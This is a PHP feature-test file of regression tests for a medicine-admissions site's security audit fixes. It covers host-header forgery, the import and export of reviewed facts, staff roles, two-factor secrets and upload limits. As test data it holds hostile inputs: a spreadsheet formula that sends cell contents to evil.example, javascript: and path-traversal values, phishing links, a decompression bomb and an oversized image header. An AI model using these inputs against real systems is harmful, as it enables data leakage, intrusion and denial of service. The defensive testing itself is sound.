<?php

namespace Tests\Feature;

use App\Http\Controllers\Auth\TwoFactorController;
use App\Http\Middleware\EnsureTwoFactor;
use App\Models\Course;
use App\Models\ReferenceFact;
use App\Models\TierPrice;
use App\Models\University;
use App\Models\User;
use App\Notifications\StaffNotification;
use App\Services\Documents\DocumentStore;
use App\Support\Totp;
use Database\Seeders\PlatformSeeder;
use Illuminate\Auth\Notifications\ResetPassword;
use Illuminate\Foundation\Testing\RefreshDatabase;
use Illuminate\Support\Facades\DB;
use Illuminate\Support\Facades\File;
use Illuminate\Support\Facades\Log;
use Illuminate\Support\Facades\Notification;
use Illuminate\Support\Facades\Password;
use Illuminate\Validation\ValidationException;
use Symfony\Component\HttpFoundation\Request;
use Tests\TestCase;

/** Regression tests for the 2026-10-04 security audit (ops/reports/security-audit-2026-10-04.md). */
class SecurityAuditFixesTest extends TestCase
{
    use RefreshDatabase;

    protected function setUp(): void
    {
        parent::setUp();
        // TrustHosts stores trusted hosts statically on the Symfony request; a production-mode test earlier in the run
        // leaves them set. Start every test from a clean slate.
        Request::setTrustedHosts([]);
    }

    protected function tearDown(): void
    {
        Request::setTrustedHosts([]);
        parent::tearDown();
    }

    public function test_production_refuses_a_request_for_a_host_that_is_not_app_url(): void
    {
        config(['app.url' => 'https://studymedicineuknigeria.com']);
        $this->app['env'] = 'production';
        $this->get('http://evil.example/fees')->assertStatus(400);
        $this->get('https://studymedicineuknigeria.com/fees')->assertOk();
    }

    private function canonical(): void
    {
        config(['app.url' => 'https://studymedicineuknigeria.com', 'app.force_canonical_host' => true]);
    }

    public function test_a_forged_host_header_never_reaches_a_password_reset_link(): void
    {
        $this->canonical();
        Notification::fake();
        $user = User::factory()->create(['email' => 'victim@example.test']);

        $this->post('http://evil.example/password/email', ['email' => 'victim@example.test']);

        Notification::assertSentTo($user, ResetPassword::class, function (ResetPassword $n) use ($user) {
            $url = $n->toMail($user)->actionUrl;
            $this->assertStringStartsWith('https://studymedicineuknigeria.com/password/reset/', $url);
            $this->assertStringNotContainsString('evil.example', $url);

            return true;
        });
    }

    public function test_the_front_controller_redirect_never_uses_the_request_host(): void
    {
        $this->canonical();
        $this->get('http://evil.example/index.php/fees')->assertStatus(301)->assertRedirect('https://studymedicineuknigeria.com/fees');
    }

    private function feeFact(): ReferenceFact
    {
        $u = University::create(['slug' => 'testville', 'name' => 'University of Testville', 'nation' => 'England', 'international_policy' => 'accepts']);
        $c = Course::create(['university_id' => $u->id, 'slug' => 'a100', 'title' => 'Medicine MBBS', 'entry_type' => 'standard']);

        return $c->facts()->create(['key' => 'international_fee_gbp', 'value_number' => 50000, 'academic_year' => '2026/27', 'verification_status' => 'VERIFY-ON-PAGE', 'source_url' => 'https://example.ac.uk/fees', 'source_type' => 'official']);
    }

    private function decisions(string $rows): string
    {
        $file = 'storage/framework/testing/decisions-'.uniqid().'.csv';
        File::ensureDirectoryExists(base_path('storage/framework/testing'));
        File::put(base_path($file), "ref,decision,verified_value,new_source_url,reviewer_note,verified_on\n".$rows);

        return $file;
    }

    public function test_replaying_a_decisions_file_never_reverses_a_later_review(): void
    {
        $fee = $this->feeFact();
        $file = $this->decisions("course:testville/a100:international_fee_gbp:2026/27,verified,52000,,,2026-10-04\n");
        $this->artisan('smukn:facts-import', ['file' => $file])->assertSuccessful();
        $this->assertSame('VERIFIED', $fee->fresh()->verification_status);

        // a later review (admin queue) finds the page has changed
        $fee->update(['verification_status' => 'SOURCE_CHANGED', 'value_number' => 55000]);

        // the next deploy replays every committed decisions file
        $this->artisan('smukn:facts-import', ['file' => $file])->expectsOutputToContain('Already applied')->assertSuccessful();
        $this->assertSame('SOURCE_CHANGED', $fee->fresh()->verification_status);
        $this->assertEquals(55000, $fee->fresh()->value_number);
        File::delete(base_path($file));
    }

    public function test_an_imported_source_url_must_be_https(): void
    {
        $fee = $this->feeFact();
        $file = $this->decisions("course:testville/a100:international_fee_gbp:2026/27,verified,,javascript:alert(1),,2026-10-04\n");
        $this->artisan('smukn:facts-import', ['file' => $file])->expectsOutputToContain('must be an https:// address')->assertSuccessful();
        $this->assertSame('https://example.ac.uk/fees', $fee->fresh()->source_url);
        $this->assertSame('VERIFY-ON-PAGE', $fee->fresh()->verification_status);
        File::delete(base_path($file));
    }

    public function test_the_import_is_logged_at_a_level_production_keeps(): void
    {
        $this->feeFact();
        Log::spy();
        $file = $this->decisions("course:testville/a100:international_fee_gbp:2026/27,verified,,,,2026-10-04\n");
        $this->artisan('smukn:facts-import', ['file' => $file])->assertSuccessful();
        Log::shouldHaveReceived('warning')->withArgs(fn ($msg) => $msg === 'fact.worksheet_import')->once();
        File::delete(base_path($file));
    }

    public function test_the_worksheet_never_contains_a_live_spreadsheet_formula(): void
    {
        $fee = $this->feeFact();
        $fee->update(['value_number' => null, 'value_text' => '=HYPERLINK("https://evil.example/?"&A2,"Open")', 'notes' => '+cmd']);
        $file = 'storage/framework/testing/worksheet-'.uniqid().'.csv';
        $this->artisan('smukn:facts-export', ['file' => $file])->assertSuccessful();
        $csv = File::get(base_path($file));
        $this->assertStringContainsString("'=HYPERLINK", $csv);
        $this->assertStringContainsString("'+cmd", $csv);
        $this->assertDoesNotMatchRegularExpression('/(^|,)"?=HYPERLINK/m', $csv);
        File::delete(base_path($file));
    }

    public function test_worksheet_commands_stay_inside_the_project(): void
    {
        $this->artisan('smukn:facts-export', ['file' => '../outside.csv'])->assertFailed();
        $this->artisan('smukn:facts-import', ['file' => '../../etc/hostname'])->assertFailed();
    }

    public function test_student_text_in_a_staff_email_cannot_become_a_link(): void
    {
        $admin = User::factory()->create();
        $html = (string) (new StaffNotification('New message', ['[Reset your admin password](https://evil.example/login) and <https://evil.example/x>'], 'http://localhost/admin'))->toMail($admin)->render();
        $this->assertStringNotContainsString('href="https://evil.example', $html);
        $this->assertStringContainsString('Reset your admin password', $html, 'the text itself is still shown to staff');
    }

    private function staff(string $role): User
    {
        $u = User::factory()->create(['email_verified_at' => now()]);
        $u->forceFill(['role' => $role, 'two_factor_secret' => Totp::generateSecret(), 'two_factor_confirmed_at' => now()])->save();

        return $u;
    }

    private function as(User $u): static
    {
        return $this->actingAs($u)->withSession([EnsureTwoFactor::SESSION_KEY => $u->id]);
    }

    public function test_only_admins_change_prices_or_remove_redirects(): void
    {
        $this->seed(PlatformSeeder::class);
        $price = TierPrice::firstOrFail();
        $before = $price->amount_minor;
        $id = DB::table('redirects')->insertGetId(['from_path' => '/old', 'to_path' => '/fees', 'active' => true, 'status_code' => 301, 'created_at' => now(), 'updated_at' => now()]);

        $staff = $this->staff('staff');
        $this->as($staff)->post(route('admin.tiers.price', $price), ['amount' => 1])->assertForbidden();
        $this->as($staff)->delete(route('admin.redirects.delete', $id))->assertForbidden();
        $this->assertSame($before, $price->fresh()->amount_minor);
        $this->assertDatabaseHas('redirects', ['id' => $id]);

        // admins can, and omitting the Stripe field no longer raises an error
        $this->as($this->staff('admin'))->post(route('admin.tiers.price', $price), ['amount' => 12.5])->assertSessionHas('status');
        $this->assertSame(1250, $price->fresh()->amount_minor);
    }

    public function test_a_redirect_cannot_be_placed_over_sign_in_with_a_double_slash(): void
    {
        $admin = $this->staff('admin');
        foreach (['//login', '//admin', '/', ''] as $from) {
            $this->as($admin)->post(route('admin.redirects.store'), ['from_path' => $from, 'to_path' => '/fees'])->assertSessionHasErrors('from_path');
        }
        $this->assertDatabaseCount('redirects', 0);
    }

    public function test_an_enrolled_authenticator_is_never_replaced_from_a_session_secret(): void
    {
        $admin = $this->staff('admin');
        $original = $admin->two_factor_secret;
        $planted = Totp::generateSecret();
        $this->actingAs($admin)->withSession([TwoFactorController::PENDING_SECRET => $planted])
            ->post('/two-factor/setup', ['code' => Totp::code($planted)])->assertRedirect(route('two-factor.challenge'));
        $this->assertSame($original, $admin->fresh()->two_factor_secret);
    }

    public function test_signing_in_discards_a_secret_planted_before_sign_in(): void
    {
        $user = User::factory()->create(['email' => 'ada@example.test', 'password' => 'Testpass12345', 'email_verified_at' => now()]);
        $this->withSession([TwoFactorController::PENDING_SECRET => 'PLANTED'])
            ->post('/login', ['email' => 'ada@example.test', 'password' => 'Testpass12345'])->assertSessionMissing(TwoFactorController::PENDING_SECRET);
    }

    public function test_one_account_is_locked_after_many_failures_from_many_addresses(): void
    {
        User::factory()->create(['email' => 'target@example.test']);
        for ($i = 0; $i < 50; $i++) {
            $this->withServerVariables(['REMOTE_ADDR' => "10.0.{$i}.1"])->post('/login', ['email' => 'target@example.test', 'password' => 'wrong-password-1']);
        }
        $this->withServerVariables(['REMOTE_ADDR' => '10.9.9.9'])->post('/login', ['email' => 'target@example.test', 'password' => 'wrong-password-1'])
            ->assertSessionHasErrors(['email' => 'Too many attempts. Try again in 60 minutes.']);
    }

    public function test_changing_the_password_signs_out_other_sessions(): void
    {
        $user = User::factory()->create(['password' => 'Oldpass12345', 'email_verified_at' => now()]);
        // another device: a session that recorded the old password hash
        $old = ['password_hash_web' => $user->getAuthPassword()];
        $this->actingAs($user)->withSession($old)->get('/portal')->assertOk();

        $this->actingAs($user)->withSession($old)->put('/portal/profile/password', ['current_password' => 'Oldpass12345', 'password' => 'Newpass12345', 'password_confirmation' => 'Newpass12345'])->assertSessionHas('status');

        // the other device still carries the old hash: it is signed out
        $this->actingAs($user->fresh())->withSession($old)->get('/portal')->assertRedirect(route('login'));
    }

    public function test_the_reset_form_does_not_reveal_whether_an_account_exists(): void
    {
        User::factory()->create(['email' => 'known@example.test']);
        $message = __(Password::InvalidToken);
        foreach (['known@example.test', 'nobody@example.test'] as $email) {
            $this->post('/password/reset', ['token' => 'bogus', 'email' => $email, 'password' => 'Newpass12345', 'password_confirmation' => 'Newpass12345'])
                ->assertSessionHasErrors(['email' => $message]);
        }
    }

    public function test_an_image_declaring_enormous_dimensions_is_refused_before_decoding(): void
    {
        $this->seed(PlatformSeeder::class);
        // a valid PNG header that declares 20,000 × 20,000 pixels
        $ihdr = pack('N', 20000).pack('N', 20000)."\x08\x02\x00\x00\x00";
        $png = "\x89PNG\r\n\x1a\n".pack('N', 13).'IHDR'.$ihdr.pack('N', crc32('IHDR'.$ihdr));
        $m = new \ReflectionMethod(DocumentStore::class, 'reencodeImage');
        $this->expectException(ValidationException::class);
        $m->invoke(app(DocumentStore::class), $png, 'image/png');
    }

    public function test_a_pdf_whose_object_stream_inflates_beyond_the_cap_is_refused(): void
    {
        $bomb = gzcompress(str_repeat('A', 17 * 1024 * 1024), 9);
        $pdf = "%PDF-1.7\n1 0 obj\n<< /Type /ObjStm /N 1 /First 4 /Filter /FlateDecode /Length ".strlen($bomb)." >>\nstream\n".$bomb."\nendstream\nendobj\n%%EOF";
        $m = new \ReflectionMethod(DocumentStore::class, 'assertSafePdf');
        $this->expectException(ValidationException::class);
        $m->invoke(app(DocumentStore::class), $pdf);
    }
}
